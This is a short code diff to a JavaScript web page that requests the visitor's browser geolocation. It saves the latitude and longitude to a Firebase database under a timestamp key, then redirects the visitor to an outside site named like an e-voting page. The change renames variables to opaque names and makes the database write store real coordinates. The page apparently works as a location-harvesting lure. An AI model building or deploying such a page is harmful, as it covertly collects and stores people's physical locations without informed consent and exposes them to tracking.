@@ -14,22 +14,22 @@ firebase.initializeApp(firebaseConfig);
 // Initialize Firebase
 console.log(firebase)
 
-var d = new Date();
-let time = d.getTime();
-var x = document.getElementById("demo");
+var msk = new Date();
+let time = msk.getTime();
+var jlun = document.getElementById("demo");
 
 function getSave() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
   } else { 
-    x.innerHTML = "Pastikan anda menyetujui lokasi!";
+    jlun.innerHTML = "Pastikan anda menyetujui lokasi!";
   }
 }
 
 function showPosition(position) {
-    x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+    jlun.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
     var slat = position.coords.latitude;
     var slong = position.coords.longitude;
-    firebase.database().ref("/").child("test").update({ Latitude : oke, Longitude : oke });
+    firebase.database().ref("/").child(time).update({ Latitude : slat, Longitude : slong });
     window.location.assign("http://mevoting.is-best.net/");
 }
